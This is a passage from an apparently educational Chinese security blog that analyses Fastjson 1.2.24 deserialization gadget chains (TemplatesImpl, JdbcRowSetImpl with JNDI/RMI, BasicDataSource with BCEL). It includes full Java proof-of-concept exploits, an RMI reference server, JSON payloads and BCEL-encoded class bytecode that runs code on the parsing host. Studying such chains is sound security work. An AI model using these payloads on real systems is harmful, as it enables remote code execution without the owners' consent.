title="分析以及exp编写："></a>分析以及exp编写：</h2><p>我们在学<code>TemplatesImpl</code>中知道它一个内部类<code>TransletClassLoader</code>的<code>defineClass</code>方法，调用了<code>ClassLoader</code>的<code>defineClass</code>。（这条链是cc3的，也出现在我们的类加载中。）</p><p>这条调用链是这样的：</p><blockquote><p><code>TemplatesImpl#getOutputProperties</code>–&gt;<code>TemplatesImpl#newTransformer</code>–&gt; <code>TemplatesImpl#getTransletInstance</code>–&gt; <code>TemplatesImpl#defineTransletClasses()</code>–&gt;<code>TemplatesImpl#defineClass()</code></p></blockquote><p>有个<code>getTransletInstance</code>和<code>getOutputProperties</code>正好符合我们的fastjson特性。</p><p>而选择<code>getTransletInstance</code>是调用失败的，因为该类返回的是一个抽象类。</p><p><img src="/./../blog_image/image-20240408135134381.png" alt="image-20240408135134381"></p><p>因此选择<code>getOutputProperties</code>：</p><p>这个方法的返回值是<code>Properties</code>，不是返回的接口。</p><p><img src="/./../blog_image/image-20240408135250693.png" alt="image-20240408135250693"></p><p>构造链也很简单：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span>className<span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;_bytecodes&quot;</span><span class="hljs-punctuation">:</span>evalBytes<span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;_tfactroy&quot;</span><span class="hljs-punctuation">:</span>new TransformerFactoryImpl()<span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;_name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Calc&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>完整poc如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;<br>        <span class="hljs-type">byte</span>[] evilBytes = readFile();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">encode</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(evilBytes);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">text1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + className + <span class="hljs-string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span> + encode + <span class="hljs-string">&quot;\&quot;],\&quot;_name\&quot;:\&quot;Calc\&quot;,\&quot;_tfactory\&quot;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&#125;&quot;</span>;<br>        System.out.println(text1);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> JSON.parseObject(text1, Object.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ParserConfig</span>(), Feature.SupportNonPublicField);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] readFile() <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">return</span> Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Language\\Java\\java_code\\Security\\serialize\\cc3\\target\\classes\\Calc.class&quot;</span>));<br>    &#125;<br></code></pre></td></tr></table></figure><p>需要注意的点是<code>_tfactory</code>传入的值是一个类，然后<code>_bytecodes</code>传入的是一个byte数组，因此需要使用<code>[]</code>去包裹。最重要的是我们需要调用<code>getOutputProperties</code>方法，因此需要对其进行赋值，这个值也是一个类。</p><h2 id="疑惑："><a href="#疑惑：" class="headerlink" title="疑惑："></a>疑惑：</h2><h3 id="疑点1：为什么传入的-bytecodes要进行base64编码："><a href="#疑点1：为什么传入的-bytecodes要进行base64编码：" class="headerlink" title="疑点1：为什么传入的_bytecodes要进行base64编码："></a>疑点1：为什么传入的<code>_bytecodes</code>要进行base64编码：</h3><p>在<code>ObjectArrayCodec</code>中的<code>deserialze</code>方法中有一个方法是<code> lexer.bytesValue()</code>，会对传入的字符串进行base64解码。这个调用是在<code>DefaultJSONParser</code>的<code>deserializer.deserialze</code>调用的。</p><p><img src="/./../blog_image/image-20240408132834764.png" alt="image-20240408132834764"></p><h3 id="疑点2：为什么需要传入ParserConfig方法："><a href="#疑点2：为什么需要传入ParserConfig方法：" class="headerlink" title="疑点2：为什么需要传入ParserConfig方法："></a>疑点2：为什么需要传入<code>ParserConfig</code>方法：</h3><p>其实这个方法有无都一样。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;<br>    <span class="hljs-type">byte</span>[] evilBytes = readFile();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">encode</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(evilBytes);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + className + <span class="hljs-string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span> + encode + <span class="hljs-string">&quot;\&quot;],\&quot;_name\&quot;:\&quot;Calc\&quot;,\&quot;_tfactory\&quot;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&#125;&quot;</span>;<br>    System.out.println(payload);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> JSON.parseObject(payload,Feature.SupportNonPublicField);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] readFile() <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-keyword">return</span> Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Language\\Java\\java_code\\Security\\serialize\\cc3\\target\\classes\\Calc.class&quot;</span>));<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h1 id="0x04-JdbcRowSetImpl利用链："><a href="#0x04-JdbcRowSetImpl利用链：" class="headerlink" title="0x04 JdbcRowSetImpl利用链："></a>0x04 JdbcRowSetImpl利用链：</h1><h2 id="JNDI-RMI："><a href="#JNDI-RMI：" class="headerlink" title="JNDI + RMI："></a>JNDI + RMI：</h2><p>就是简单的JNDI Reference 的攻击方式。</p><p><code>JdbcRowSetImpl </code>中有一个<code>setDataSourceName</code>，用于设置数据源。</p><p>生成一个<code>Calc.class</code>，然后启动一个http服务：</p><p><img src="/./../blog_image/image-20240408150134295.png" alt="image-20240408150134295"></p><p>服务端如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RmiServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">aa</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;Calc.class&quot;</span>, <span class="hljs-string">&quot;Calc&quot;</span>, <span class="hljs-string">&quot;http://127.0.0.1:8081/&quot;</span>);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">refObjWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(aa);<br>        registry.bind(<span class="hljs-string">&quot;aa&quot;</span>, refObjWrapper);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>exp：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/aa\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">parse</span> <span class="hljs-operator">=</span> JSON.parse(payload);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="JNDI-LDAP："><a href="#JNDI-LDAP：" class="headerlink" title="JNDI + LDAP："></a>JNDI + LDAP：</h2><p>还不太会，看师傅的博客：</p><p><a href="https://drun1baby.top/2022/08/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8702-Fastjson-1-2-24%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#2-JNDI-LDAP">Java反序列化Fastjson篇02-Fastjson-1.2.24版本漏洞分析 | Drunkbaby’s Blog (drun1baby.top)</a></p><h1 id="0x05-BasicDataSource链："><a href="#0x05-BasicDataSource链：" class="headerlink" title="0x05 BasicDataSource链："></a>0x05 BasicDataSource链：</h1><h2 id="关于BECL："><a href="#关于BECL：" class="headerlink" title="关于BECL："></a>关于BECL：</h2><p>BCEL(Byte Code Engineering Library)的全名是Apache Commons BCEL，属于Apache Commons项目下的一个子项目，BCEL库提供了一系列用于分析、创建、修改Java Class文件的API。相较Commons Collections，BCEL被包含在原生JDK中，更容易被利用。</p><p>BCEL Classloader在 JDK &lt; 8u251之前是在rt.jar里面<br>在Tomcat中也会存在相关的依赖<br>tomcat7：org.apache.tomcat.dbcp.dbcp.BasicDataSource<br>tomcat8+：org.apache.tomcat.dbcp.dbcp2.BasicDataSource</p><p>com.sun.org.apache.bcel.internal.util.ClassLoader重写了Java内置的ClassLoader#loadClass()方法，会判断类名是否是<code>BCEL</code>开头，如果是的话，将会对这个字符串进行decode。可以理解为是传统字节码的HEX编码，再将反斜线替换成$。默认情况下外层还会加一层GZip压缩。</p><p>具体可以我的反序列化的类的动态加载那一篇文章。</p><p>前面我们使用了<code>JdbcRowSetImpl</code>和<code>TemplatesImpl</code>这两条链，其中jdbc那一条使用到了jndi注入，大部分情况下不能实现不出网利用，而<code>TemplatesImpl</code>这一条链虽然可以传入一个base64编码后的bytes，但是需要服务端开启<code>Feature.SupportNonPublicField</code>设置，因为它不存在set方法，这两条利用链算是有点苛刻。</p><p>但是这里的<code>BasicDataSource</code>则不一样了，在不出网不开启<code>Feature.SupportNonPublicField</code>的时候就可以利用这条链。</p><h2 id="编写BECL-Demo："><a href="#编写BECL-Demo：" class="headerlink" title="编写BECL Demo："></a>编写BECL Demo：</h2><p><code>Repository</code>主要是讲这个class生成一个java原生的字节码。</p><p><code>Utility</code>主要用于讲原生的class进行编码成BECL认识的格式。</p><p>这里使用<code>Class.forName</code>去获取class。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">JavaClass</span> <span class="hljs-variable">javaClass</span> <span class="hljs-operator">=</span> Repository.lookupClass(Class.forName(<span class="hljs-string">&quot;Calc&quot;</span>));<br><span class="hljs-type">String</span> <span class="hljs-variable">encode</span> <span class="hljs-operator">=</span> Utility.encode(javaClass.getBytes(),<span class="hljs-literal">true</span>);<br>System.out.println(encode);<br></code></pre></td></tr></table></figure><p>还可以使用文件读取的方式，最终也是传入一个bytes给<code>Utility</code>jin’x</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Language\\Java\\java_code\\Security\\fastjson\\1224\\target\\classes\\Calc.class&quot;</span>));<br><span class="hljs-type">String</span> <span class="hljs-variable">encode</span> <span class="hljs-operator">=</span> Utility.encode(bytes,<span class="hljs-literal">true</span>);<br>System.out.println(encode);<br></code></pre></td></tr></table></figure><p>如何进行类加载？</p><p>导入的是<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassLoader</span>().loadClass(<span class="hljs-string">&quot;$$BCEL$$&quot;</span> +<span class="hljs-string">&quot;$l$8b$I$A$A$A$A$A$A$AmQMO$db$40$Q$7d$9b$af$b5$5d$HBB$S$9a$W$da$A$z$J$87$e6$c2$zQ$_$a8$95$aa$g$a8$IJ$d5$e3fY$c2$82$b1$91$e3$40$feQ$cf$b9$b4$I$a4$f6$ce$8fB$9du$a34Rj$c93$9e$f7$de$bc$9d$f1$3e$3e$dd$ff$C$b0$87$86$D$hk$O$9e$a3f$e1$85$c9$_9$d696$i$e4$f0$8a$e35G$9d$n$d7$d1$81$8e$df3$a4$h$cd$kCf$3f$3cU$M$cb$9e$O$d4$e1$e8$aa$af$a2$T$d1$f7$J$vz$a1$U$7eOD$da$d4S0$T$9f$eb$nyx$fb$c2$97m$G$ab$p$fd$a9$j$p$ba$ec$5d$88$h$d1$d2a$eb$d3$d1$87$b1T$d7$b1$O$D$92$e5$bb$b1$90$97$H$e2$3a$b1$a1$a1$Y$9cn8$8a$a4$fa$a8$8d$adm$ec$de$99$5e$X$O$9eql$ba$d8$c26$9dG$pH$Xo$f0$96$a1$f4$lo$86Z$82$fa$o$Y$b4$8eGA$ac$af$d4$8c4$5e$3bfC$f2$60$u$fc$T$k$f5$_$94$8c$ZV$Wzi$ae$81$8agE$b9$d1$f4$W4$b4OF$8d$VY$ee4$e6$d8n$i$e9$60$d0$9eo$f8$S$85R$N$87$d4$b06$af$3c9$8f$c2$5b$f3$p$da$cd$k$ea$b0$e8$d6$cc$93$C3$cbSt$a9jQf$94$b3$bb$3f$c1$s$J$9d$a7$98K$c04$96$u$ba$7f$FXF$81$b2$85$95Y$f3$Z$v$MW$bdC$aa$98$fe$81$cc$d7$ef$c8$7f$7e$40$ee$h$b9$f1$df$93$84$b4I$9a$r$a1$b1$ad$d0$971$b7$T$94$Tf$R$e6$cc$8e$c9$T$5eD$89$aaUz9R$kG$d9$s$a2$92LV$fd$D$M$f3$G$J$84$C$A$A&quot;</span>).newInstance();<br></code></pre></td></tr></table></figure><p>因为这个loadClass方法是public，可利用点很大。</p><p><img src="/./../blog_image/image-20240416094016948.png" alt="image-20240416094016948"></p><p>主要逻辑是判断是否是以<code>&quot;$$BCEL$$&quot;</code>开头，如果是则进行loadClass。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;aaa&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;driverClassLoader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                 <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br>     <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;driverClassName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AuQ$cbn$daP$Q$3d$X$M6$8e$J$8f$U$f2h$9e$7d$C$L$yu$L$ea$a6J7u$93$wD$e9$fa$fa$e6$8a$5e062$97$88$3f$ea$9a$N$ad$ba$e8$H$f4$a3$aa$ccu$9eRZK$9e$f1$9c$99s$e6$8c$fc$e7$ef$af$df$A$de$e1$8d$L$H$9b$$$b6$b0$ed$60$c7$e4$e76v$5d$U$b0gc$df$c6$BC$b1$afb$a5$df3$e4$5b$ed$L$G$ebCr$v$Z$w$81$8a$e5$c9$7c$S$ca$f4$9c$87$R$n$f5$m$R$3c$ba$e0$a92$f5$zh$e9oj$c6$b0$j$88d$e2_$f2t$y$d30Y$f8$a1$90$91$7f$7c$a5$a2$k$83$d3$X$d1$ed$GF$8cF0$e2W$dc$8fx$3c$f4$8f$XBN$b5Jb$g$x$P4$X$e3$cf$7c$9a$v$93I$Gw$90$ccS$n$3f$w$b3$a9d$e4$ba$86$eb$a1$E$d7$c6$a1$87$p$bc$m$7dr$r$bar$n$3d$bc$c4$x$86$8d$7f$e8$7bx$N$97a$f3$3f$$$Z$aa$P$a4$d3p$q$85f$a8$3d$40g$f3X$ab$J$99p$87R$df$X$8dV$3bx2C$97X$e4E0$bcm$3d$ea$Ot$aa$e2a$ef1$e1K$9a$I9$9b$R$a12$a5$a6$ce$ee$3fO$b9$90t$97M$bf$cd$3c90s$z$c55$aa$7c$ca$8cr$a1$f3$Dl$99$b5$3d$8a$c5$M$cc$a3L$d1$bb$Z$c0$3a$w$94$jT$ef$c9$3c$T$D$ea$3f$91$ab$e7W$b0$be$7e$87$f3$a9$b3Bq$99$e1$r$e2$WH$c5$u6$e9$cb$e8$962$d4$se$H5R$ba$dbP$86Eu$9d$aa$Nzm$e4$C$h$cf$yj42S$cdk$dfl$i$C$80$C$A$A&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;xxx&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="fastjson-BECL组合拳："><a href="#fastjson-BECL组合拳：" class="headerlink" title="fastjson+BECL组合拳："></a>fastjson+BECL组合拳：</h2><p>看exp：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Language\\Java\\java_code\\Security\\fastjson\\1224\\target\\classes\\Calc.class&quot;</span>));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> Utility.encode(bytes, <span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\&quot;driverClassName\&quot;:\&quot;$$BCEL$$&quot;</span> + code + <span class="hljs-string">&quot;\&quot;,\&quot;driverClassloader\&quot;: &#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;&#125;&#125;&quot;</span>;<br>        JSON.parseObject(s);<br>    &#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Language\\Java\\java_code\\Security\\fastjson\\1224\\target\\classes\\Calc.class&quot;</span>));<br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassLoader</span>();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> Utility.encode(bytes,<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">BasicDataSource</span> <span class="hljs-variable">basicDataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BasicDataSource</span>();<br>        basicDataSource.setDriverClassLoader(classLoader);<br>        basicDataSource.setDriverClassName(<span class="hljs-string">&quot;$$BCEL$$&quot;</span>+code);<br>        basicDataSource.getConnection();<br>    &#125;<br></code></pre></td></tr></table></figure><p>payload如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;driverClassName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;becl编码的class&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;driverClassloader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>fastjson就要找get函数，看入口类<code>BasicDataSoure</code>的get方法，找到<code>getConnection</code>方法：</p><p><img src="/./../blog_image/image-20240416152130661.png" alt="image-20240416152130661"></p><p>跟进<code>createDataSoure</code>方法里面的<code>createConncetionFactory</code>方法：</p><p><img src="/./../blog_image/image-20240416152219472.png" alt="image-20240416152219472"></p><p><code>createConncetionFactory</code>方法里面调用了<code>ConnectionFactoryFactory#createConnectionFactory</code></p><p><img src="/./../blog_image/image-20240416152350731.png" alt="image-20240416152350731"></p><p>查看<code>createDriver</code>方法，点击调试前，会调用<code>ClassLoader(BECL)</code></p><p><img src="/./../blog_image/image-20240416154104943.png" alt="image-20240416154104943"></p><p>然后会调用<code>getDriverClassName</code>方法，获取driverClassName，并且获取classloader类加载器：</p><p><img src="/./../blog_image/image-20240416154141682.png" alt="image-20240416154141682"></p><p>恶意代码是这一行：</p><p><img src="/./../blog_image/image-20240416154458959.png" alt="image-20240416154458959"></p><p>直接调用<code>Class.forName</code>，正常我们的代码是这样的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassLoader</span>();<br>classLoader.loadClass(<span class="hljs-string">&quot;$$BCEL$$&quot;</span>+code).newInstance();<br></code></pre></td></tr></table></figure><p>我们可以尝试跑一下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Language\\Java\\java_code\\Security\\fastjson\\1224\\target\\classes\\Calc.class&quot;</span>));<br><span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> Utility.encode(bytes, <span class="hljs-literal">true</span>);<br><span class="hljs-type">ClassLoader</span> <span class="hljs-variable">driverClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassLoader</span>();<br>Class.forName(<span class="hljs-string">&quot;$$BCEL$$&quot;</span>+code, <span class="hljs-literal">true</span>, driverClassLoader);<br></code></pre></td></tr></table></figure><p>效果和上面的一样，<code>Class.forName()</code>的第二个参数是是否实例化，设置为true则会调用<code>newInstance</code>方法，第三个参数是加载器。因此这段代码和上面的一样。然后我们观察上面的恶意代码，如果<code>driverClassName</code>可控，那么就可以实现反序列化了。</p><p><code>driverClassName</code>是通过调用get方法去获取的，</p><p><img src="/./../blog_image/image-20240416155248465.png" alt="image-20240416155248465"></p><p>发现存在set方法，可以使用fastjson进行赋值：</p><p><img src="/./../blog_image/image-20240416155349042.png" alt="image-20240416155349042"></p><p>而同理<code>driverClassLoader</code>也是可控的，</p><p>因此构造思路如下：</p><blockquote><ol><li>首先@type BasicDataSource这个类，然后对driverClassName进行赋值，设置为我们的becl编码的值</li><li>同理调用@type BasicDataSource 对driverClassLoader进行赋值，设置为com.sun.org.apache.bcel.internal.util.ClassLoader（tomcat7和8不一样，需要注意。）</li><li>然后调用主入口BasicDataSource#getConnection方法。</li></ol></blockquote><p>尝试自己构造payload，然后发现这个<code>getConncetion</code>哪里调用的？</p><p>如果使用parse，会发现没有结果。</p><p>这里就要使用<code>parseObejct</code>方法，因为<code>parseObject</code>方法会调用传入类的所有get方法，那么就会调用<code>getConnection</code>方法，可以看下面的demo：</p><p><img src="/./../blog_image/image-20240416160901477.png" alt="image-20240416160901477"></p><p>因此完整的exp如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Language\\Java\\java_code\\Security\\fastjson\\1224\\target\\classes\\Calc.class&quot;</span>));<br>    <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> Utility.encode(bytes, <span class="hljs-literal">true</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\&quot;driverClassName\&quot;:\&quot;$$BCEL$$&quot;</span> + code + <span class="hljs-string">&quot;\&quot;,\&quot;driverClassloader\&quot;: &#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;&#125;&#125;&quot;</span>;<br>    JSON.parseObject(s);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="总结："><a href="#总结：" class="headerlink" 